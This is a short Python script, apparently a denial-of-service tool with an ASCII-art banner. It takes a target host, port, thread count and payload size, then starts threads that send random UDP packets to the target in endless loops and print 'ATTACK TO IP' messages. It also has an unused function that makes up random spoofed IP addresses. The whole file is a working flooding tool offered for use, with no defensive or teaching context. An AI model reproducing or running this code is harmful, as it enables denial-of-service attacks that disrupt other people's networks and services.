import random
import socket
import threading
import os,sys
import getpass

os.system("clear")
print("""\033[91m
  _____        __  __     _____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/ """)

ip = str(input("HOST/IP :"))
port = int(input("PORT :"))
times = int(input("TIMES :"))
threads = int(input("THREAD :"))
urandom = int(input("URANDOM :"))
os.system("clear")
def run():
    data = random._urandom(urandom)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            print("[X] WIBU!!!")

def run2():
    data = random._urandom(urandom)
    i = random.choice(("[×]","[√]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"ATTACK TO IP %s AND PORT %s"%(ip,port))
        except:
            s.close()
            print("[X] WIBU!!!")

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
        th = threading.Thread(target = run)
        th.start()
else:
        th = threading.Thread(target = run2)
        th.start()
